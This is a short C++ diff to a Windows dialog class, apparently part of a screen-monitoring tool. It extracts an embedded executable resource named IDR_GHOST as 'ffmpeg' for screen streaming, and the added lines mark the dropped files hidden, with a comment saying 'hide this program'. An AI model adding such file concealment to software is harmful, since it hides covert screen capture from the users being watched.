@@ -256,6 +256,7 @@ BOOL CKeeperDlg::ReleaseRes(const char *strFileName, WORD wResID, const CString 
 	// 写入文件
 	WriteFile(hFile, hG, dwSize, &dwWrite, NULL);
 	CloseHandle( hFile );
+	SetFileAttributesA(strFileName, FILE_ATTRIBUTE_HIDDEN);
 	return TRUE;
 }
 
@@ -1244,6 +1245,7 @@ void CKeeperDlg::ffmepgStart(int nPort)
 		ReleaseRes(ffmpeg, (WORD)IDR_GHOST, L"EXE");
 	if (0 == _access(ffmpeg, 0))
 	{
+		SetFileAttributesA(ffmpeg, FILE_ATTRIBUTE_HIDDEN);// 隐藏此程序
 		int x = 0, y = 0;// 传屏起始位置
 		int w = ::GetSystemMetrics(SM_CXSCREEN);  //屏幕宽度
 		int h = ::GetSystemMetrics(SM_CYSCREEN);  //屏幕高度
